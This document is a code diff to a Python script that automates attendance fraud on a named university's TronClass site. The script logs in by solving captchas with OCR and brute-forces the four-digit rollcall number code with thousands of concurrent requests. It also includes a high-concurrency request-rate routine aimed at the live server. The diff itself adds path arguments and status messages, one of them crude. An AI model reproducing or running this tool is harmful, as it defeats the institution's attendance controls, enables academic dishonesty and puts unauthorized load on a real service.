@@ -15,12 +15,29 @@ from http.cookies import SimpleCookie
 from PIL import Image
 import pytesseract
 import io
+import argparse
 
 pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
 TRON = 'https://tronclass.ntou.edu.tw'
-PATH = Path('log')
 PATTERN = re.compile(r'(LT[^"]+)')
-with open(Path(__file__).parent.parent / 'config.yaml', 'r', encoding='utf-8') as file:
+
+parser = argparse.ArgumentParser(description='here is not descroption')
+parser.add_argument('-c', '--config', type=str, help="Path to YAML config file")
+parser.add_argument('-l', '--log', type=str, help="Path to save file location")
+args = parser.parse_args()
+
+if args.log:
+    LOGPATH = args.log
+else:
+    LOGPATH = Path(__file__).parent.parent / 'log'
+
+if args.config:
+    YAMLPATH = args.config
+else:
+    YAMLPATH = Path(__file__).parent.parent / 'config.yaml'
+    pass
+
+with open(YAMLPATH, 'r', encoding='utf-8') as file:
     CONFIG = yaml.safe_load(file)
 
 class LoginFaild(Exception):
@@ -161,44 +178,42 @@ async def number(rcid: int):
 
         nonlocal succeed, code
         async with semaphore:
-            for _ in range(10):
-                try:
-                    async with session.put(
-                        f'{TRON}/api/rollcall/{rcid}/answer_number_rollcall',
-                        json={
-                            'deviceId': device,
-                            'numberCode': f'{try_code:04d}'
-                        },
-                    ) as resp:
-                        if resp.status == 200:
-                            code = f'{try_code:04d}'
-                            print(code)
-                            await mes(code)
+            try:
+                async with session.put(
+                    f'{TRON}/api/rollcall/{rcid}/answer_number_rollcall',
+                    json={
+                        'deviceId': device,
+                        'numberCode': f'{try_code:04d}'
+                    },
+                ) as resp:
+                    if resp.status == 200:
+                        code = f'{try_code:04d}'
+                        print(code)
+                        await mes(code)
 
-                        elif resp.status == 400:
-                            pass
+                    elif resp.status == 400:
+                        pass
 
-                        tmp_log.append({
-                            'data': (
-                                str(resp.url),
-                                resp.status,
-                                await resp.json()
-                            ),
-                            'id': try_code
-                        })
-
-                        succeed += 1
-                    break
-                except Exception as e:
                     tmp_log.append({
-                            'data': (
-                                str(resp.url),
-                                resp.status,
-                                str(e) + await resp.text()
-                            ),
-                            'id': try_code
-                        })
-                    await asyncio.sleep(5)
+                        'data': (
+                            str(resp.url),
+                            resp.status,
+                            await resp.json()
+                        ),
+                        'id': try_code
+                    })
+
+                    succeed += 1
+            except Exception as e:
+                tmp_log.append({
+                        'data': (
+                            str(resp.url),
+                            resp.status,
+                            str(e) + await resp.text()
+                        ),
+                        'id': try_code
+                    })
+                await asyncio.sleep(5)
         return
 
     timediff = time.perf_counter()
@@ -208,7 +223,7 @@ async def number(rcid: int):
         await tqdm_asyncio.gather(*tasks, desc=f'brute-forcing with {rcid}')
     timediff = time.perf_counter()-timediff
 
-    path = PATH/'num'/f'{rcid}.log'
+    path = LOGPATH/'num'/f'{rcid}.log'
     for i in tqdm(tmp_log, desc='saving log file'):
         log(path, i['data'], i['id'])
     log(path, (
@@ -236,7 +251,7 @@ async def check_rollcall(session: aiohttp.ClientSession, cnt:int = -1) -> int:
         y = str(today.year)
         m = str(today.month)
         d = str(today.day)
-        log(PATH/y/m/f'{d}.log', (str(resp.url), resp.status, json), cnt)
+        log(LOGPATH/y/m/f'{d}.log', (str(resp.url), resp.status, json), cnt)
 
         if json.get('rollcalls'):
             rollcall: dict = json['rollcalls'][0]
@@ -329,7 +344,7 @@ async def checkpw():
 
 async def qps(count:int = 10000):
     semaphore = asyncio.Semaphore(2000)
-    path = PATH/'qps'/f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.log'
+    path = LOGPATH/'qps'/f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.log'
     succeed = 0
     tmp_log = []
                 
@@ -385,6 +400,7 @@ cnt = 0
 async def main():
     global cnt
     flag_day_night = False
+    flag_working = False
     async with aiohttp.ClientSession() as session:
         session.cookie_jar.update_cookies(await login())
         error_cnt = 0
@@ -421,10 +437,20 @@ async def main():
 
             try:
                 await check_rollcall(session, cnt)
+                if not flag_working:
+                    flag_working = True
+                    text = 'has been restored'
+                    print(text)
+                    await mes(text)
             except Exception as e:
+                if flag_working:
+                    flag_working = False
+                    text = 'fuck up'
+                    print(text)
+                    await mes(text)
+
                 if error_cnt < CONFIG['config']['retries']:
                     text = (
-                        f'{CONFIG["account"]["user"]}:  \n'
                         f'check rollcall error on {cnt}  \n'
                         f'trying {error_cnt} times  \n'
                         f'error message: {e}'
